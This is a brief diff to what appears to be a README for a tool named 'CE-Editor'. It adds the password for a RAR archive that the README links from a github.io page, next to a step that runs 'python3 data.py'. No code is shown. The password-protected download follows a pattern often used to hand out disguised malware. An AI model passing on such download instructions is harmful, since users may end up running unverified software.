@@ -7,3 +7,5 @@ cd CE-Editor
 python3 data.py
 ```
 [Click Here To Download](https://thecode764.github.io/CE-Editor.rar)
+# To Open RAR File
+Password: thecode764.github.io
